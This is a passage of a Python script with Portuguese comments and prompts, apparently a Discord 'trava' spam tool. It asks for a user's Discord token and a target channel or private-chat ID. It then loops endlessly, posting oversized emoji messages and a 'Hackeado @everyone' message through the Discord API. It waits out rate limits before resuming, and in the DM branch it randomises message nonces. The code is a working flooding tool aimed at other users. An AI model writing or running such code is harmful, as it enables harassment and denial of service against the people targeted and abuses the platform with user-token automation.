🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷**'}
        
        cID = str(input("ID Do Chat -> ")).strip() # Aqui Estou solicitando que o usuario insira o ID Do chat que ele deseja flodar.
        os.system('cls')
        print('Opção De Emojis:\n\n')
        print('---------------------')
        print('[1] -> 🐵🙈🙉🙊🐒')
        print('[2] -> Hackeado @everyone')
        print('[3] -> 🦹🦸🦸‍♀️🧚‍♀️🥷')
        print('---------------------')
        op = str(input("Qual Usar? ->")).strip()
## Comando do Menu  [1]
        if op == '1':
            while True:
                try:
                    r = requests.post(f'https://discord.com/api/v8/channels/{cID}/messages', headers=headers, json=payload1)
                    if r.status_code == 200:
                        print('Enviando...Travas')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui {data["retry_after"]} segundos!!')
                        time.sleep(data['retry_after'])
                    else:
                        print(f'ERRO ERRO | {r.status_code} | {r.text}')
                except Exception as errorWarn:
                    print('ERRO ERRO | {}'.format(errorWarn))
## Comando Linha    [2]
        elif op == '2':
            while True:
                try:
                    r = requests.post(f'https://discord.com/api/v8/channels/{cID}/messages', headers=headers, json=payload2)
                    if r.status_code == 200:
                        print('Enviando...Travas')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui {data["retry_after"]} segundos!!')
                        time.sleep(data['retry_after'])
                    else:
                        print(f'ERRO ERRO| {r.status_code} | {r.text}')
                except Exception as errorWarn:
                    print('ERRO ERRO| {}'.format(errorWarn))
## Comando Linha    [3]        
        elif op == '3':
            while True:
                try:
                    r = requests.post(f'https://discord.com/api/v8/channels/{cID}/messages', headers=headers, json=payload3)
                    if r.status_code == 200:
                        print('Enviando...Travas')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui {data["retry_after"]} segundos!!')
                        time.sleep(data['retry_after'])
                    else:
                        print(f' ERRO ERRO | {r.status_code} | {r.text}')
                except Exception as errorWarn:
                    print(' ERRO ERRO| {}'.format(errorWarn))
        
        else:
           os.system("color 4")
           print('DIGITE APENAS 1, 2 OU 3!')
           input('Pressione ENTER Para Fechar!!')
           exit() 
        
## Comando do Menu  [2]
    elif groupORdm == '2':
        os.system('cls')
        print(logo)
        token = str(input("Token -> ")).strip() # Aqui Estou solicitando que o usuario insira o TOKEN.

        uID = str(input("ID Do Privado (COPIE OS NUMEROS DEPOIS DO @me/)-> ")).strip() # Aqui Estou solicitando que o usuario insira o ID Da Pessoa ele deseja travar.
        print('Opção De Emojis:\n\n')
        print('---------------------')
        print('[1] -> 🐵🙈🙉🙊🐒')
        print('[2] -> 🎃🐌🐠🦧🐯')
        print('[3] -> 🦹🦸🦸‍♀️🧚‍♀️🥷')
        print('---------------------')
        op = str(input("Qual Usar? ->")).strip()

        nn = ['1','2','3','4','5','6','7','8','9','0']
        
        headers = {'Authorization':token,
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Connection':'keep-alive',
        'Content-Type':'application/json',
        'Host':'discord.com',
        'Origin':'https://discord.com',
        'Referer':f'https://discord.com/channels/@me/{uID}'}
## Comando da linha [1]       
        if op == '1':
            while True:
                try:
                    n = random.choice(nn)
                    n1 = random.choice(nn)
                    n2 = random.choice(nn)
                    n3 = random.choice(nn)
                    n4 = random.choice(nn)
                    n5 = random.choice(nn)
                    n6 = random.choice(nn)
                    payload = {'content':'**🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐵🐒🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🙈🙉🐵🙈🙉🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈**',
                    'nonce': f'7707895532{n1}{n6}{n5}{n4}{n3}3{n}{n2}',
                    'tts': 'false'}

                    r = requests.post(f'https://discord.com/api/v8/channels/{uID}/messages', headers=headers, json=payload)
                    if r.status_code == 200:
                        print('Enviando...Travas')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui 7 segundos!!')
                        time.sleep(7)
                    else:
                        print(f'Houve Um Erro CRITÍCO! | {r.status_code} | {r.text}')
                        input('\n     Pressione ENTER Para Fechar!!')
                        exit()
                except Exception as errorWarn:
                    print('Houve Um Erro CRITÍCO! | {}'.format(errorWarn))
                    input('\n     Pressione ENTER Para Fechar!!')
                    exit()
            time.sleep(0.5)
            os.system('color')
            time.sleep(0.5)
## Comando da linha [2] 
        elif op == '2':
            while True:
                try:
                    n = random.choice(nn)
                    n1 = random.choice(nn)
                    n2 = random.choice(nn)
                    n3 = random.choice(nn)
                    n4 = random.choice(nn)
                    n5 = random.choice(nn)
                    n6 = random.choice(nn)
                    payload2 = {'content':'**🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌